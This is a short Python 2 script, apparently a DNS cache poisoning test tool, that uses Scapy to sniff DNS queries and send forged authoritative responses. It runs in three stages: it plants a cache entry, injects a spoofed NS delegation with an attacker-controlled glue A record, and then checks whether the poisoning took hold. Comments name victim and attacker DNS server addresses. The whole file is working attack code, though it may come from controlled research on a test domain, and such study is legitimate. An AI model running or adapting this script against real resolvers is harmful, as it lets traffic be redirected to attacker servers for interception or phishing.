#coding=utf-8
from scapy.all import *
import re


def makeSeedPacket (inputPacket,ip,dns):
    
    if(re.search("172\.16\.0\.11",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=3600,rdata="0.0.1.1"))
    


def makePoisonPacket (inputPacket,ip,dns):#  Victim DNS = 23.105.208.62  ;  Attacker DNS = 134.175.49.111
   
    if(re.search("172\.16\.0\.10",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qdcount=1,nscount=1,arcount=1,qd=dns.qd,ns=DNSRR(rrname='sub.test3.ownhp.cn',type = "NS",ttl=3600,rdata="ns3.test3.ownhp.cn"),ar=DNSRR(rrname='ns3.test3.ownhp.cn',type = "A",ttl=3600,rdata="39.108.238.75"))#134.175.49.111,type="A"
    
    if(re.search("172\.1\.18\.163",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qdcount=1,ancount=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=3600,rdata="0.0.5.2"))
  
   

def makeValidatePacket (inputPacket,ip,dns):
    
    if(re.search("172\.16\.0\.10",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=3600,rdata="0.0.5.4"))
         
    if(re.search("172\.1\.18\.163",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=3600,rdata="0.0.5.3"))
                                                                                                                                                                                    
    

while 1:
    wakeUpPacket=sniff(filter="port 53 ",count=1)

    if not wakeUpPacket[0].haslayer(DNS) or wakeUpPacket[0].qr : 
        continue                                                                                                                                                                                                                                                                    

    ip=wakeUpPacket[0].getlayer(IP)
    dns=wakeUpPacket[0].getlayer(DNS)
	
    if(wakeUpPacket[0].qr==0 and re.search(" one[a-zA-Z0-9]*\.test[a-zA-Z0-9]*\.ownhp\.cn",wakeUpPacket[0].qd.qname) ):
        one=makeSeedPacket(wakeUpPacket[0],ip,dns)
        if(one):
            send(one)
            print "\n  note1: the response packet to plant DNS cache is sent. \n"
        continue
    if(wakeUpPacket[0].qr==0 and re.search("two[a-zA-Z0-9]*\.sub\.test[a-zA-Z0-9]*\.ownhp\.cn",wakeUpPacket[0].qd.qname)):
        two=makePoisonPacket(wakeUpPacket[0],ip,dns)
        if(two):
            send(two)
            print "\n  note2: the response packet to poison DNS cache is sent.\n"
        continue
    if(wakeUpPacket[0].qr==0 and re.search("three[a-zA-Z0-9]*\.sub\.test[a-zA-Z0-9]*\.ownhp\.cn",wakeUpPacket[0].qd.qname)):
        three=makeValidatePacket(wakeUpPacket[0],ip,dns)
        if(three):
            send(three)
            print "\n  note3: the response packet to check the result of poisoning is sent.\n"
            print "\n  note: continue listening ..\n"
        continue
    continue
      
    